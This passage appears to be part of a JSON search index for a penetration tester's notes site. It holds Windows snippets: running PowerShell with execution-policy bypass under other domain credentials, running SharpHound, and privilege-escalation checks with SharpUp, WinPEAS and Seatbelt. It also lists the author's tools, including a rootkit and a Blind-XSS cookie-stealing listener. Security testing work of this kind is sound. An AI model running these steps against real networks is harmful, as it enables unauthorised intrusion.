additional environment variables, parameters and co to be set. You may also have issues with DNS if your routing is not set properly\nWarning\nThe initial command does not check if the credentials are valid. Credentials are only checked during authentication when other tools are ran.\n# Create a powershell instance running as the DOMAIN\\USER account runas /netonly /user:DOMAIN\\USER \"powershell.exe -exec bypass\" # check if the credentials are valid for example by running ls on a share you know if open and readable ls \\\\\u003cdomain-controller\u003e\\SYSVOL\\ # run commands that will make network communications Enter-PSSession -ComputerName ... Sharphound.exe "},"title":"Misc Snippets"},"/bazaar/windows/post-exploitation--looting/":{"data":{"":" Tbd"},"title":"Post Exploitation \u0026 Looting"},"/bazaar/windows/privilege-escalation/":{"data":{"":"","#":"Automated Scanners tldr: Run sharpup first. If nothing found, run winpeas. SharpUp good, Winpeas ok More shit from Winpeas but takes longer and lots of garbage data from it. Also sometimes misses easy wins for me. Also seatbelt. Run all checks: Seatbelt.exe -group=all -full icacls DACLs explained icacls c:\\windows\\* Displays or modifies discretionary access control lists (DACLs) on specified files, and applies stored DACLs to files in specified directories. Ref: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls\nToken Privileges # run whoami /priv # check against table in repo below Ref: https://github.com/gtworek/Priv2Admin"},"title":"Privilege Escalation"},"/code/":{"data":{"":" Important\nThe layout of this section is a work in progress.\nTldr\nTools, code and other research stuff that I’ve made public. Content ordered using a single iteration of bogosort…","research#research":"github (ext) BSD rootkit | a BSD rootkit and rootkit detector (written for research \u0026 education) silentbook | Proof-of-Concept app allowing encrypted messaging over Facebook messenger using AES-256 encryption CRC-32 hash collider | Naive bruteforce attack to find a CRC-32 hash collision based on a provided CRC-32 value and a charset. CRC-32 is not a cryptographic hash function. There are mathematical ways to reverse the hash value to a valid input. For more information, see the following tool. gists (ext) webserver.go | Simple Golang webserver serving files from a directory and logging all incoming requests (ip, headers and body content) replay-http.go | Simple Golang tool to replay an http request from a txt file. whoami.go | Golang webserver which echo’s the request back to you and prints your IP address. sqlmap-proxy.go | Golang proxy example to abuse more complex SQL injections which may not be picked up by sqlmap. For example, SQL injections in CTF challenges. ","tools#tools":" dreamcatcher | a TCP listener which allows the same port to be used as a HTTP file server (similarly to python’s SimpleHTTPServer) and handle’s other TCP connections similarly to netcat. blistener | a Blind-XSS listener with javascript payloads to retrieve the target user’s browser data including cookies, local/session storage, html code (and optionally a screenshot) of current page (also works as a HTTP listener) genx | a fast alternative domain name generator to help in generating potential subdomains of a target. Useful when starting recon on a domain. dnsfaster | a tool to benchmark DNS resolvers in order to find resolvers with the highest speed and accuracy. short domain finder | a golang application which aims to find the shortest available domain based on user parameters (ie. length, domain extension). How I found this domain "},"title":"Code"}}